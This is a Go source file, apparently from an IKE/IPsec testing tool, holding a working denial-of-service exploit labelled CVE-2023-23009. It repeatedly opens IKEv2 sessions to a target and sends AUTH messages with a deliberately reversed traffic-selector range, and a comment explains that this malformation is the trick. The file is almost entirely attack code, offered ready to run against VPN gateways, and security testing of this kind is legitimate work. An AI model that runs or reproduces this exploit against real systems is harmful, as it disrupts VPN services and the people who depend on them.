package exploits

import (
	"fmt"
	"net"

	"github.com/PhilipM-eu/ikepoke/internal/IKESession"
	"github.com/PhilipM-eu/ikepoke/internal/targets"
)

func CVE202323009(srcIP, srcPort string, target *targets.Target, psk []byte, timeout int) {

	fmt.Println("Initiating a DoS attempt")
	sourceIP := net.ParseIP(srcIP)
	if sourceIP == nil {

		fmt.Println("could not parse provided source IP address")
		return
	}
	// The TSi or TSr payload needs to be malformed for this exploit to work - mixing around the start address and end address of the TSr range does the trick
	auth := IKESession.Auth{

		PSK:         []byte(psk),
		IDType:      1,
		ID:          sourceIP.To4(),
		TSiSourceIP: sourceIP.To4(),
		TSrStartIP:  []byte{255, 255, 255, 255},
		TSrEndIP:    []byte{0, 0, 0, 0},
	}
	errorCounter := 0
	for {

		session := IKESession.NewSession(srcIP, srcPort, target.IP, target.Port, timeout)
		if session.ConnectToTargetIKEv2() {

			session.SendIKEv2AUTH(auth)
			errorCounter = 0

		} else {

			errorCounter++

			if errorCounter > 5 {
				break
			}

		}
	}

	fmt.Println("DoS successful or blocked by firewall.")
}
